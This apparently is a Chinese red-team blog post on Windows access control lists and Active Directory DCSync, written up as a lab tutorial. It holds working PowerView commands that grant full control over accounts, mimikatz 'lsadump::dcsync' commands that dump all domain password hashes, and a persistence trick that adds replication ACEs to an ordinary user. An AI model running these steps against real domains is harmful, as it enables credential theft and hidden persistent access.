---
layout:     post
title:    域渗透-Windows下的访问控制列表及DCSync
subtitle:  ACL及域内权限维持DCSync
date:       2021-02-07
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 域渗透
    - 红队
    - 内网渗透
---
# 域渗透-Windows下的访问控制列表及DCSync

## Access Control List介绍
简单来说，访问控制，是指某主体对某实体执行读取、写入、删除、更改等某种操作是否被允许，在Windows中，通常主体是进程，客体可能是文件、目录、管道、服务、注册表、打印机、共享等。访问控制即对对应的访问行进行判断是否具有合法权限执行相应的操作。Windows操作系统会为访问行为的主体创建访问令牌，且当访问行为的实体被创建时操作系统会为其创建一个安全描述符，ACL对权限的访问控制正是通过访问令牌和安全描述符来完成的。  
这里提下安全描述符的概念：   
当一个对象被创建时，系统将为其分配安全描述符，安全描述符包含了该对象的属主对该对象所配置的一些安全属性和策略，安全描述符由4部分组成，包含SID（标识该对象拥有的SID），DACL（该对象的访问控制策略），SACL（该对象的访问行为的审计策略）、Flag；其中几个重要的概念：   
- DACL：Discretionary Access Control List，用来表示安全对象权限的列表
- SACL：System Access Control List，用来记录对安全对象访问的日志  
- ACE： Access Control Entry，ACL中的元素  

## 查看ACL
通过文件属性进行查看，查看对应文件（文件夹）的高级安全设置，其中权限项就是DACL，审核项就是SACL，DACL中的内容就是ACE。  
![](/img/210207_DACL.png)  
每条ACE可以查看详情，查看具体具有的操作权限。  
![](/img/210207_ACE.png)  
同样的可以通过命令行查看指定文件的ACL。  
```
icacls Path
```  
![](/img/210207_icacls.png)  
其中：  
(OI) - 对象继承，(CI) - 容器继承，(IO) - 仅继承，(GR) - 一般性读取，(GW) - 一般性写入，(GE) - 一般性执行。   

也可以通过powershell查看：  
```
$acl = Get-Acl -Path Path
$acl.Access
```
![](/img/210207_psacl.png)  
当然建议也可以用PowerView。  
常用命令：  
```
Get-DomainObjectAcl -Domain de1ay.com  //获取指定域内所有对象的ACL
Get-DomainUser testa                   //获取指定用户的ACL
Add-DomainObjectAcl -TargetIdentity testb -PrincipalIdentity testa -Rights All -Verbose //testa对testb有完全控制权限
Remove-DomainObjectAcl -TargetIdentity testb -PrincipalIdentity testa -Rights All -Verbose  //移除对应完全控制权限
```
## 实际利用
域内常见的可利用的ACL：  
- GenericAll ：拥有一个可以完全控制用户/组的权限。
- GenericWrite ：此权限能够更新目标对象的属性值。
- WriteProperty ：这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限。
- WriteDacl ：攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。

快速查看域内拥有WriteProperty权限的账户：  
```
Get-DomainObjectAcl | Where-Object {$_.ActiveDirectoryRight -eq "WriteProperty"}
```
![](/img/210207_writeproperty.png)  
测试一个修改密码的案例。  
新建一个testb的普通域账户，通过赋予testa对testb的完全控制权限，来用testa修改testb账户密码。  
```
Add-DomainObjectAcl -TargetIdentity testb -PrincipalIdentity testa -Rights All -Verbose
```  
![](/img/210207_addacl.png)  
此时用testa来修改testb的密码，发现可以成功修改，而再此之前是不可以的。  
![](/img/210207_changepwd.png)  
更多的操作可以看文章2，这里不再赘述。  


## DCSync
DCSync是利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据，常用导出域内用户hash，也用来作为域权限维持。  
前提是拥有以下任一用户的权限：   
- Administrators组内的用户
- DA组内的用户
- EA组内的用户
- 域控制器的计算机帐户

## 实际利用
直接通过mimikatz或者powershell导出即可，这里只演示mimikatz。  
```
mimikatz.exe "lsadump::dcsync /domain:de1ay.com /all /csv" exit
mimikatz.exe "lsadump::dcsync /domain:de1ay.com /user:username /csv" exit  //导出指定用户的hash
```
在拥有域控权限下，直接可以导出。我这里是通过伪造的金票，才可以用testa导出的。    
![](/img/210207_DCSync.png)  

## 利用DCSync进行权限维持
前提是拥有以下任一用户的权限：  
- DA组内的用户
- EA组内的用户

利用原理：   
向域内的一个普通用户添加如下三条ACE(Access Control Entries)：  
- DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
- DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
- DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)

该用户即可获得利用DCSync导出域内所有用户hash的权限。   
直接可以利用PowerView来完成对应的操作。  
```
Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync -Verbose

```
![](/img/210207_dcsyncac.jpg)   
添加完后，在testa的权限下调用cmd执行对应命令即可导出域内hash。  

## 总结
简单介绍了ACL的概念以及一些基础的应用，通过两个简单的案例学习了PowerView的一些基础用法。  
感谢各作者分享的经验。  

## 参考
[https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/)    
[https://422926799.github.io/posts/be9dae0a.html](https://422926799.github.io/posts/be9dae0a.html)   













